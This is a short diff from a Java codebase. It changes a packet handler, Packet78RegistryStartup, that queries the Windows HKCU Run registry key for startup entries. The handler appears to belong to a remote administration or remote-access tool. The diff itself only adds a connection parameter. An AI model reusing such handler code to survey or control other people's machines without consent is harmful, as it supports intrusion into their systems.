@@ -12,7 +12,7 @@ import com.redpois0n.oslib.OperatingSystem;
 public class Packet78RegistryStartup extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		try {
 			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hkcu\\software\\microsoft\\windows\\currentversion\\run\\", "/s" });
